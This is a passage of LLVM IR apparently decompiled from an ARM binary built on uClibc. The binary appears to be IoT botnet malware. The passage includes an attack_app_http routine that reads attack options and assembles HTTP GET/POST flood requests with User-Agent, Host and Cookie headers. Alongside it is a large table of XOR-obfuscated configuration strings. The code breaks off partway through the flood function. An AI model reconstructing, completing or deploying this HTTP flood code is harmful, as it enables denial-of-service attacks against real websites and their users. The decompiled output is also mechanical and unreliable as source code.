source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%anon_struct_4 = type { i32, i32*, i8, i8 }
%anon_struct_13 = type { i32, i32*, i8, i8 }
%anon_struct_13.3 = type { i32, i32*, i8, i8 }
%vfp_regs = type { [16 x i64], i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_233c8.22 = global i32 0
@global_var_e9fc.26 = constant i32 -382906384
@global_var_1a788.29 = constant [4 x i8] c"GET\00"
@global_var_1a78c.31 = constant i32 47
@global_var_15730.34 = constant i32 -450904024
@global_var_10000.35 = constant i32 167772226
@global_var_1a780.37 = constant i32 32
@global_var_1a758.39 = constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00"
@global_var_1a770.41 = constant [9 x i8] c"\0D\0AHost: \00"
@global_var_1a77c.43 = constant [3 x i8] c"\0D\0A\00"
@global_var_1a790.45 = constant [9 x i8] c"Cookie: \00"
@global_var_1a79c.47 = constant [3 x i8] c"; \00"
@global_var_1a7a8.49 = constant i32 59
@global_var_1a7a0.51 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_1a7ac.53 = constant [5 x i8] c"http\00"
@global_var_1a7b4.55 = constant [5 x i8] c"url=\00"
@global_var_1a7bc.57 = constant [5 x i8] c"POST\00"
@global_var_1a7c4.59 = constant i32 39
@global_var_118dc.60 = constant i32 -439279616
@global_var_1aab8.62 = constant i32 61
@global_var_1446c.63 = constant i32 -382909968
@global_var_235ec.67 = global i32 0
@global_var_d248.73 = constant i32 -382906384
@global_var_d6b4.75 = constant i32 -382906384
@global_var_c9bc.77 = constant i32 -382906384
@global_var_c2e4.79 = constant i32 -382906384
@global_var_bbc0.81 = constant i32 -382906384
@global_var_b394.83 = constant i32 -382906384
@global_var_ad34.85 = constant i32 -382906384
@global_var_a66c.87 = constant i32 -382906384
@global_var_81d0.89 = constant i32 -382906384
@global_var_2610c.91 = global i32 0
@global_var_235f0.102 = global i32 0
@global_var_26110.106 = local_unnamed_addr global i32 0
@global_var_235f4.108 = global i32 0
@global_var_e764.111 = constant i32 -382910448
@global_var_2347c.113 = global i32 72560
@global_var_26118.117 = local_unnamed_addr global i32 0
@global_var_26116.118 = local_unnamed_addr global i32 0
@global_var_23474.120 = global i32 -1
@global_var_235f8.125 = global i32 0
@global_var_1a7c8.132 = constant i32 10
@global_var_23478.134 = global i32 -1
@global_var_11b70.139 = constant i32 -382910352
@global_var_1a7cc.143 = constant i32 16777216
@global_var_23600.145 = global i32 0
@global_var_2360c.147 = global i32 0
@global_var_23604.149 = global i32 0
@global_var_23608.151 = global i32 0
@global_var_2612c.161 = global i32 0
@global_var_23644.163 = global i32 0
@global_var_23610.165 = global i32 0
@global_var_2363c.167 = global i32 0
@global_var_26124.174 = global i32 0
@global_var_26128.176 = global i32 0
@global_var_23616.179 = local_unnamed_addr global i32 0
@global_var_23628.181 = global i32 0
@global_var_2361c.183 = local_unnamed_addr global i32 0
@global_var_23618.184 = local_unnamed_addr global i32 0
@global_var_2361d.185 = local_unnamed_addr global i32 0
@global_var_23636.188 = local_unnamed_addr global i32 0
@global_var_1a7dc.190 = constant [8 x i8] c"1!%1\229?\00"
@global_var_1a7d4.192 = constant [6 x i8] c"14=9>\00"
@global_var_1a7e4.194 = constant [5 x i8] c" 1##\00"
@global_var_1a7ec.196 = constant [9 x i8] c"381>75=5\00"
@global_var_1a7f8.198 = constant i32 490349927
@global_var_1a7a4.200 = constant i32 0
@global_var_1a8d8.202 = constant [5 x i8] c"abcd\00"
@global_var_1a808.204 = constant [4 x i8] c"14=\00"
@global_var_1a80c.206 = constant [5 x i8] c"\22??$\00"
@global_var_1a814.208 = constant [5 x i8] c"1>;?\00"
@global_var_1a81c.210 = constant [7 x i8] c"(3ceaa\00"
@global_var_1a824.212 = constant [6 x i8] c"$$>5$\00"
@global_var_1a82c.214 = constant [9 x i8] c"8%>$egei\00"
@global_var_1a838.216 = constant [6 x i8] c"&9*(&\00"
@global_var_1a840.218 = constant [6 x i8] c"abcde\00"
@global_var_1a848.220 = constant [9 x i8] c"a``a389>\00"
@global_var_1a854.222 = constant [8 x i8] c"4561%<$\00"
@global_var_1a85c.224 = constant [4 x i8] c"abc\00"
@global_var_1a860.226 = constant [7 x i8] c"1>$#<!\00"
@global_var_105cc.227 = constant i32 108648
@global_var_1a868.228 = constant [4 x i8] c"e% \00"
@global_var_1a86c.230 = constant [9 x i8] c":%1>$538\00"
@global_var_1a878.232 = constant [6 x i8] c"*<((~\00"
@global_var_1a880.234 = constant [7 x i8] c"abcdef\00"
@global_var_1a888.236 = constant [11 x i8] c"?5<9>%(abc\00"
@global_var_1a894.238 = constant [7 x i8] c"\0A$5eba\00"
@global_var_1a89c.240 = constant i32 490349927
@global_var_1a8ac.242 = constant [5 x i8] c"%#5\22\00"
@global_var_1a8b4.244 = constant [7 x i8] c"415=?>\00"
@global_var_1a8bc.246 = constant [4 x i8] c"29>\00"
@global_var_1a8c0.248 = constant [8 x i8] c"#%  ?\22$\00"
@global_var_1a8c8.250 = constant [11 x i8] c"#% 5\22&9#?\22\00"
@global_var_1a8d4.252 = constant [9 x i8] c"*)14abcd\00"
@global_var_23620.253 = local_unnamed_addr global i32 0
@global_var_2361e.254 = local_unnamed_addr global i32 0
@global_var_23624.255 = local_unnamed_addr global i32 0
@global_var_2362c.257 = local_unnamed_addr global i32 0
@global_var_23638.258 = local_unnamed_addr global i32 0
@global_var_f388.260 = constant i32 -382910352
@global_var_1060c.261 = constant i32 108412
@global_var_1a8e6.263 = constant i32 2096127
@global_var_1a8dd.265 = constant i32 2095871
@global_var_26134.272 = global i32 0
@global_var_23484.275 = global i32 1043935
@global_var_1a8ec.280 = constant i32 39228
@global_var_26144.281 = local_unnamed_addr global i32 0
@global_var_26148.282 = local_unnamed_addr global i32 0
@global_var_1a8f0.284 = constant i32 55430
@global_var_26154.285 = local_unnamed_addr global i32 0
@global_var_26158.286 = local_unnamed_addr global i32 0
@global_var_1a8f4.288 = constant [20 x i8] c"jT^VXYsTZZXOnQ\5CDXO=\00"
@global_var_2615c.289 = local_unnamed_addr global i32 0
@global_var_26160.290 = local_unnamed_addr global i32 0
@global_var_1a908.292 = constant i32 1380928786
@global_var_26164.293 = local_unnamed_addr global i32 0
@global_var_26168.294 = local_unnamed_addr global i32 0
@global_var_1a910.296 = constant i32 1480939538
@global_var_2616c.297 = local_unnamed_addr global i32 0
@global_var_26170.298 = local_unnamed_addr global i32 0
@global_var_1a918.300 = constant i32 1029266194
@global_var_26178.301 = local_unnamed_addr global i32 0
@global_var_26174.302 = local_unnamed_addr global i32 0
@global_var_1a920.304 = constant i32 1380928786
@global_var_2617c.305 = local_unnamed_addr global i32 0
@global_var_26180.306 = local_unnamed_addr global i32 0
@global_var_1a930.308 = constant i32 1297895442
@global_var_26184.309 = local_unnamed_addr global i32 0
@global_var_26188.310 = local_unnamed_addr global i32 0
@global_var_1a938.312 = constant i32 1548307986
@global_var_2618c.313 = local_unnamed_addr global i32 0
@global_var_26190.314 = local_unnamed_addr global i32 0
@global_var_1a944.316 = constant i32 1414749203
@global_var_26194.317 = local_unnamed_addr global i32 0
@global_var_26198.318 = local_unnamed_addr global i32 0
@global_var_1a94c.320 = constant i32 1380928786
@global_var_2619c.321 = local_unnamed_addr global i32 0
@global_var_261a0.322 = local_unnamed_addr global i32 0
@global_var_1a960.324 = constant i32 1380928786
@global_var_261a4.325 = local_unnamed_addr global i32 0
@global_var_261a8.326 = local_unnamed_addr global i32 0
@global_var_1a970.328 = constant i32 1920627327
@global_var_261ac.329 = local_unnamed_addr global i32 0
@global_var_261b0.330 = local_unnamed_addr global i32 0
@global_var_1a97c.332 = constant i32 1581864978
@global_var_261b4.333 = local_unnamed_addr global i32 0
@global_var_261b8.334 = local_unnamed_addr global i32 0
@global_var_1a990.336 = constant i32 1599867994
@global_var_261c0.337 = local_unnamed_addr global i32 0
@global_var_261bc.338 = local_unnamed_addr global i32 0
@global_var_1a9a8.340 = constant [9 x i8] c"\5CNNJROY=\00"
@global_var_261c4.341 = local_unnamed_addr global i32 0
@global_var_261c8.342 = local_unnamed_addr global i32 0
@global_var_1a9b4.344 = constant i32 1264081170
@global_var_261cc.345 = local_unnamed_addr global i32 0
@global_var_261d0.346 = local_unnamed_addr global i32 0
@global_var_1a9c4.348 = constant i32 1264081170
@global_var_261d4.349 = local_unnamed_addr global i32 0
@global_var_261d8.350 = local_unnamed_addr global i32 0
@global_var_1a9d8.352 = constant i32 1264081170
@global_var_261dc.353 = local_unnamed_addr global i32 0
@global_var_261e0.354 = local_unnamed_addr global i32 0
@global_var_1a9f0.356 = constant i32 1264081170
@global_var_261e4.357 = local_unnamed_addr global i32 0
@global_var_261e8.358 = local_unnamed_addr global i32 0
@global_var_1aa0c.360 = constant i32 1264081170
@global_var_261f0.361 = local_unnamed_addr global i32 0
@global_var_261ec.362 = local_unnamed_addr global i32 0
@global_var_1aa1c.364 = constant [7 x i8] c"NUXQQ=\00"
@global_var_261f4.365 = local_unnamed_addr global i32 0
@global_var_261f8.366 = local_unnamed_addr global i32 0
@global_var_1aa24.368 = constant [8 x i8] c"XS\5C_QX=\00"
@global_var_261fc.369 = local_unnamed_addr global i32 0
@global_var_26200.370 = local_unnamed_addr global i32 0
@global_var_1aa2c.372 = constant [8 x i8] c"NDNIXP=\00"
@global_var_26204.373 = local_unnamed_addr global i32 0
@global_var_26208.374 = local_unnamed_addr global i32 0
@global_var_1aa34.376 = constant [4 x i8] c"NU=\00"
@global_var_2620c.377 = local_unnamed_addr global i32 0
@global_var_26210.378 = local_unnamed_addr global i32 0
@global_var_1aa38.380 = constant i32 1398038290
@global_var_26214.381 = local_unnamed_addr global i32 0
@global_var_26218.382 = local_unnamed_addr global i32 0
@global_var_1aa54.384 = constant i32 1449022538
@global_var_26220.385 = local_unnamed_addr global i32 0
@global_var_2621c.386 = local_unnamed_addr global i32 0
@global_var_1aa74.388 = constant [10 x i8] c"S^ROOX^I=\00"
@global_var_26224.389 = local_unnamed_addr global i32 0
@global_var_26228.390 = local_unnamed_addr global i32 0
@global_var_2622c.391 = local_unnamed_addr global i32 0
@global_var_26230.392 = local_unnamed_addr global i32 0
@global_var_1aa80.394 = constant [6 x i8] c"RZTS=\00"
@global_var_26234.395 = local_unnamed_addr global i32 0
@global_var_1aa88.397 = constant [7 x i8] c"XSIXO=\00"
@global_var_2623c.398 = local_unnamed_addr global i32 0
@global_var_1aa90.400 = constant i32 1398038290
@global_var_26244.401 = local_unnamed_addr global i32 0
@global_var_1aaa4.403 = constant i32 1398038290
@global_var_2624c.404 = local_unnamed_addr global i32 0
@global_var_1aabc.406 = constant i32 1213361769
@global_var_26254.407 = local_unnamed_addr global i32 0
@global_var_1aad4.409 = constant i32 1581864978
@global_var_2625c.410 = local_unnamed_addr global i32 0
@global_var_1aae8.412 = constant [12 x i8] c"S\5CPXNXOKXO=\00"
@global_var_26264.413 = local_unnamed_addr global i32 0
@global_var_1aaf4.415 = constant i32 1397969534
@global_var_2626c.416 = local_unnamed_addr global i32 0
@global_var_1ae64.418 = constant i32 1482579580
@global_var_26274.419 = local_unnamed_addr global i32 0
@global_var_1aeb8.421 = constant i32 1482579580
@global_var_2627c.422 = local_unnamed_addr global i32 0
@global_var_1ab0c.424 = constant i32 1230197374
@global_var_26284.425 = local_unnamed_addr global i32 0
@global_var_1ab40.427 = constant i32 2118735950
@global_var_2628c.428 = local_unnamed_addr global i32 0
@global_var_1ab50.430 = constant i32 1331386447
@global_var_26294.431 = local_unnamed_addr global i32 0
@global_var_1ab5c.433 = constant i32 1549685329
@global_var_2629c.434 = local_unnamed_addr global i32 0
@global_var_1ab68.436 = constant i32 273242190
@global_var_262a4.437 = local_unnamed_addr global i32 0
@global_var_1ab78.439 = constant i32 1230197342
@global_var_262ac.440 = local_unnamed_addr global i32 0
@global_var_1ab8c.442 = constant i32 1398558537
@global_var_262b4.443 = local_unnamed_addr global i32 0
@global_var_1aba0.445 = constant [9 x i8] c"^UHSVXY=\00"
@global_var_262bc.446 = local_unnamed_addr global i32 0
@global_var_1ab00.448 = constant i32 1297635414
@global_var_262c4.449 = local_unnamed_addr global i32 0
@global_var_1abac.451 = constant i32 1397969502
@global_var_262cc.452 = local_unnamed_addr global i32 0
@global_var_1abbc.454 = constant i32 1263491150
@global_var_262d4.455 = local_unnamed_addr global i32 0
@global_var_1abd0.457 = constant i32 1263491150
@global_var_262dc.458 = local_unnamed_addr global i32 0
@global_var_1abec.460 = constant i32 1413960304
@global_var_262e4.461 = local_unnamed_addr global i32 0
@global_var_1ac60.463 = constant i32 1413960304
@global_var_262ec.464 = local_unnamed_addr global i32 0
@global_var_1acd4.466 = constant i32 1413960304
@global_var_262f4.467 = local_unnamed_addr global i32 0
@global_var_1ad24.469 = constant i32 1413960304
@global_var_262fc.470 = local_unnamed_addr global i32 0
@global_var_1ad98.472 = constant i32 1413960304
@global_var_26304.473 = local_unnamed_addr global i32 0
@global_var_1ae0c.475 = constant i32 1264081170
@global_var_2630c.476 = local_unnamed_addr global i32 0
@global_var_1ae24.478 = constant i32 1264081170
@global_var_26314.479 = local_unnamed_addr global i32 0
@global_var_1ae40.481 = constant i32 1208552964
@global_var_2631c.482 = local_unnamed_addr global i32 0
@global_var_1ae58.484 = constant [12 x i8] c"YKOnI\5COIHM=\00"
@global_var_26324.485 = local_unnamed_addr global i32 0
@global_var_112c8.487 = constant i32 -509607927
@global_var_233cc.493 = global i32 0
@global_var_10de4.511 = constant i32 -442552176
@global_var_126a8.516 = constant i32 -443088884
@global_var_12b3c.532 = constant i32 -456978431
@global_var_10794.539 = constant i32 -476053471
@global_var_10698.547 = constant [3 x i8] c"U\0A\00"
@global_var_10650.550 = constant i32 324141114
@global_var_10510.558 = constant i32 -476053495
@global_var_1038c.569 = constant i32 -481099714
@global_var_102bc.574 = constant i32 324206650
@global_var_1342c.586 = constant i32 -478871519
@global_var_13ed0.603 = constant i32 -478805983
@global_var_142b8.613 = constant i32 -382906384
@global_var_161b0.622 = constant i32 -442544040
@global_var_14a3c.642 = constant i32 -369098502
@global_var_e604.644 = constant i32 -476053494
@global_var_15410.657 = constant i32 -382910288
@global_var_155c0.669 = constant i32 -2020859901
@global_var_156ac.672 = constant i32 -494075872
@global_var_12554.673 = constant i32 -382910336
@global_var_266b4.676 = local_unnamed_addr global i32 0
@global_var_146e8.689 = constant i32 -442543860
@global_var_12aa0.697 = constant i32 -369093278
@global_var_d23c.721 = constant [3 x i8] c";!\00"
@global_var_d1d8.724 = constant i32 -442695668
@global_var_166a8.725 = constant i32 -382910352
@global_var_17ab8.746 = constant i32 -382906384
@global_var_17578.774 = constant i32 -382910448
@global_var_18f68.775 = constant i32 -382909968
@global_var_196a4.836 = constant i32 -481296376
@global_var_1979c.837 = constant i32 -481296376
@global_var_19820.838 = constant i32 -369098732
@global_var_9a54.840 = constant i32 167772219
@global_var_235cc.12 = external global i8*
@global_var_235e8.65 = external global i8*
@global_var_235e9.71 = global i8 0
@global_var_26114.115 = global i16* null
@1 = internal constant [2 x i8] c"\01\00"
@global_var_23480.122 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_235fc.137 = external global i8*
@global_var_23640.169 = global i16* null
@global_var_23614.178 = external global i8*
@global_var_23634.182 = local_unnamed_addr global i8 0
@global_var_2362a.186 = local_unnamed_addr global i16 0
@global_var_23635.187 = local_unnamed_addr global i8 0
@global_var_23424.488 = local_unnamed_addr global i16 8

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80d8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80d8)
  %v31_80e0 = load i32, i32* @r0, align 4
  ret i32 %v31_80e0
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_80f0 = load i32, i32* @r4, align 4
  store i32 %v3_80f0, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_235cc.12 to i32), i32* %r4.global-to-local, align 4
  %v2_80f8 = load i8, i8* bitcast (i8** @global_var_235cc.12 to i8*), align 4
  %v2_80fc = icmp eq i8 %v2_80f8, 0
  br i1 %v2_80fc, label %dec_label_pc_8104, label %dec_label_pc_8120

dec_label_pc_8104:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_811c = load i32, i32* %r4.global-to-local, align 4
  %v3_811c = inttoptr i32 %v2_811c to i8*
  store i8 1, i8* %v3_811c, align 1
  %v2_8120.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8120

dec_label_pc_8120:                                ; preds = %entry, %dec_label_pc_8104
  %v2_8120 = phi i32 [ %v3_80f0, %entry ], [ %v2_8120.pre, %dec_label_pc_8104 ]
  store i32 %v2_8120, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_235cc.12, { 1, 0 }
  uselistorder label %dec_label_pc_8120, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8158 = load i32, i32* @global_var_233c8.22, align 4
  %v2_815c = icmp eq i32 %v2_8158, 0
  br i1 %v2_815c, label %dec_label_pc_8174, label %dec_label_pc_8164

dec_label_pc_8164:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8174

dec_label_pc_8174:                                ; preds = %bb, %dec_label_pc_8164
  ret i32 ptrtoint (i32* @global_var_233c8.22 to i32)

; uselistorder directives
  uselistorder i32* @global_var_233c8.22, { 1, 0 }
  uselistorder label %dec_label_pc_8174, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  store i32 0, i32* @fp, align 4
  %v4_819c = ptrtoint i32* %stack_var_4 to i32
  %v8_81bc = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_e9fc.26 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32980, i32 108344, i32 %arg1, i32 %v4_819c)
  %v0_81c0 = call i32 @abort()
  ret i32 %v0_81c0
}

define i32 @attack_app_http(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-10572 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %stack_var_-20813 = alloca i32, align 4
  %v3_81d0 = load i32, i32* @r4, align 4
  %v18_81d0 = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v5_81fc = inttoptr i32 %arg4 to i32*
  %v6_81fc = call i32 @attack_get_opt_str(i32 %arg3, i32* %v5_81fc, i32 20, i32 0, i32 %arg2)
  %v0_8200 = load i32, i32* @r5, align 4
  store i32 %v0_8200, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  %v0_820c = load i32, i32* @r4, align 4
  store i32 %v0_820c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1a788.29 to i32), i32* %r3.global-to-local, align 4
  %v6_8214 = inttoptr i32 %v0_8200 to i32*
  %v7_8214 = call i32 @attack_get_opt_str(i32 %v0_820c, i32* %v6_8214, i32 19, i32 ptrtoint ([4 x i8]* @global_var_1a788.29 to i32), i32 %v6_81fc)
  %v0_8218 = load i32, i32* @r5, align 4
  store i32 %v0_8218, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v7_8214, i32* @sb, align 4
  %v0_8228 = load i32, i32* @r4, align 4
  store i32 %v0_8228, i32* %r0.global-to-local, align 4
  %v5_822c = inttoptr i32 %v0_8218 to i32*
  %v6_822c = call i32 @attack_get_opt_str(i32 %v0_8228, i32* %v5_822c, i32 8, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v0_8230 = load i32, i32* @r5, align 4
  store i32 %v0_8230, i32* %r1.global-to-local, align 4
  store i32 %v6_822c, i32* @sl, align 4
  store i32 21, i32* %r2.global-to-local, align 4
  %v0_823c = load i32, i32* @r4, align 4
  store i32 %v0_823c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a78c.31 to i32), i32* %r3.global-to-local, align 4
  %v5_8244 = inttoptr i32 %v0_8230 to i32*
  %v6_8244 = call i32 @attack_get_opt_str(i32 %v0_823c, i32* %v5_8244, i32 21, i32 ptrtoint (i32* @global_var_1a78c.31 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8248 = load i32, i32* @r5, align 4
  store i32 %v0_8248, i32* %r1.global-to-local, align 4
  store i32 %v6_8244, i32* @r8, align 4
  store i32 23, i32* %r2.global-to-local, align 4
  %v0_8254 = load i32, i32* @r4, align 4
  store i32 %v0_8254, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_825c = inttoptr i32 %v0_8248 to i32*
  %v5_825c = call i32 @attack_get_opt_int(i32 %v0_8254, i32* %v4_825c, i32 23, i32 1)
  %v0_8260 = load i32, i32* @r5, align 4
  store i32 %v0_8260, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  store i32 %v5_825c, i32* @r6, align 4
  %v0_8270 = load i32, i32* @r4, align 4
  store i32 %v0_8270, i32* %r0.global-to-local, align 4
  %v4_8274 = inttoptr i32 %v0_8260 to i32*
  %v5_8274 = call i32 @attack_get_opt_int(i32 %v0_8270, i32* %v4_8274, i32 7, i32 80)
  %v2_827c = ptrtoint i32* %stack_var_-20813 to i32
  %v3_8284 = mul i32 %v5_8274, 65536
  store i32 %v3_8284, i32* %r3.global-to-local, align 4
  %tmp168 = bitcast i32* %stack_var_-20813 to i8*
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  store i32 10241, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8298 = urem i32 %v5_8274, 65536
  store i32 %v3_8298, i32* @r7, align 4
  %v4_829c = call i32 @__GI_memset(i8* %tmp168, i32 0, i32 10241)
  store i32 %v4_829c, i32* %r0.global-to-local, align 4
  %v0_82a0 = load i32, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_82a0 = icmp eq i32 %v0_82a0, 0
  store i1 %v2_82a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_82a0, label %.thread14, label %bb

bb:                                               ; preds = %entry
  %v1_82a4 = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_82a4 = icmp eq i32 %v1_82a4, 0
  store i1 %v3_82a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_82a4, label %bb169, label %dec_label_pc_82c4

.thread14:                                        ; preds = %entry
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_82b4

bb169:                                            ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_82b4

dec_label_pc_82b4:                                ; preds = %bb169, %dec_label_pc_82e4, %.thread14, %dec_label_pc_82d4, %dec_label_pc_82c4
  %v1_82c0 = phi i32 [ %v2_82e8, %dec_label_pc_82e4 ], [ %v4_829c, %.thread14 ], [ %v4_829c, %bb169 ], [ %v2_82d8, %dec_label_pc_82d4 ], [ %v2_82c8, %dec_label_pc_82c4 ]
  store i32 %v3_81d0, i32* %r4.global-to-local, align 4
  store i32 %v18_81d0, i32* %sb.global-to-local, align 4
  ret i32 %v1_82c0

dec_label_pc_82c4:                                ; preds = %bb
  store i32 0, i32* @r4, align 4
  store i32 %v0_82a0, i32* %r0.global-to-local, align 4
  %v1_82c8 = inttoptr i32 %v0_82a0 to i8*
  %v2_82c8 = call i32 @util_strlen(i8* %v1_82c8)
  store i32 %v2_82c8, i32* %r0.global-to-local, align 4
  %v2_82cc = icmp ugt i32 %v2_82c8, 254
  store i1 %v2_82cc, i1* %cpsr_c.global-to-local, align 1
  %v7_82cc = icmp eq i32 %v2_82c8, 255
  store i1 %v7_82cc, i1* %cpsr_z.global-to-local, align 1
  %v8_82d0 = icmp sgt i32 %v2_82c8, 255
  br i1 %v8_82d0, label %dec_label_pc_82b4, label %dec_label_pc_82d4

dec_label_pc_82d4:                                ; preds = %dec_label_pc_82c4
  %v0_82d4 = load i32, i32* @sl, align 4
  store i32 %v0_82d4, i32* %r0.global-to-local, align 4
  %v1_82d8 = inttoptr i32 %v0_82d4 to i8*
  %v2_82d8 = call i32 @util_strlen(i8* %v1_82d8)
  store i32 %v2_82d8, i32* %r0.global-to-local, align 4
  %v2_82dc = icmp ugt i32 %v2_82d8, 126
  store i1 %v2_82dc, i1* %cpsr_c.global-to-local, align 1
  %v7_82dc = icmp eq i32 %v2_82d8, 127
  store i1 %v7_82dc, i1* %cpsr_z.global-to-local, align 1
  %v8_82e0 = icmp sgt i32 %v2_82d8, 127
  br i1 %v8_82e0, label %dec_label_pc_82b4, label %dec_label_pc_82e4

dec_label_pc_82e4:                                ; preds = %dec_label_pc_82d4
  %v0_82e4 = load i32, i32* @sb, align 4
  store i32 %v0_82e4, i32* %r0.global-to-local, align 4
  %v1_82e8 = inttoptr i32 %v0_82e4 to i8*
  %v2_82e8 = call i32 @util_strlen(i8* %v1_82e8)
  store i32 %v2_82e8, i32* %r0.global-to-local, align 4
  %v2_82ec = icmp ugt i32 %v2_82e8, 8
  store i1 %v2_82ec, i1* %cpsr_c.global-to-local, align 1
  %v7_82ec = icmp eq i32 %v2_82e8, 9
  store i1 %v7_82ec, i1* %cpsr_z.global-to-local, align 1
  %v7_82f0 = icmp sgt i32 %v2_82e8, 9
  br i1 %v7_82f0, label %dec_label_pc_82b4, label %bb170

bb170:                                            ; preds = %dec_label_pc_82e4
  %v10_82f0 = ptrtoint i32* %stack_var_-408 to i32
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v8_82f4 = load i32, i32* @r4, align 4
  %v10_82f4 = add i32 %v10_82f0, 364
  %v11_82f4 = inttoptr i32 %v10_82f4 to i32*
  store i32 %v8_82f4, i32* %v11_82f4, align 4
  br label %dec_label_pc_82fc

dec_label_pc_82fc:                                ; preds = %bb170, %bb174
  %v0_82fc = load i32, i32* @sb, align 4
  store i32 %v0_82fc, i32* %r0.global-to-local, align 4
  %v1_8300 = inttoptr i32 %v0_82fc to i8*
  %v2_8300 = call i32 @util_strlen(i8* %v1_8300)
  store i32 %v2_8300, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_8308 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8308, i32* %ip.global-to-local, align 4
  %v3_830c = icmp uge i32 %v2_8300, %v3_8308
  store i1 %v3_830c, i1* %cpsr_c.global-to-local, align 1
  %v9_830c = icmp eq i32 %v2_8300, %v3_8308
  store i1 %v9_830c, i1* %cpsr_z.global-to-local, align 1
  %v7_8310 = icmp sgt i32 %v2_8300, %v3_8308
  br i1 %v7_8310, label %dec_label_pc_8314, label %dec_label_pc_8340

dec_label_pc_8314:                                ; preds = %dec_label_pc_82fc
  %v0_8314 = load i32, i32* @sb, align 4
  %v2_8314 = add i32 %v0_8314, %v3_8308
  %v3_8314 = inttoptr i32 %v2_8314 to i8*
  %v4_8314 = load i8, i8* %v3_8314, align 1
  %v6_8314 = zext i8 %v4_8314 to i32
  %v1_8318 = add nsw i32 %v6_8314, -32
  store i32 %v1_8318, i32* %r2.global-to-local, align 4
  %v1_831c = add nsw i32 %v6_8314, -97
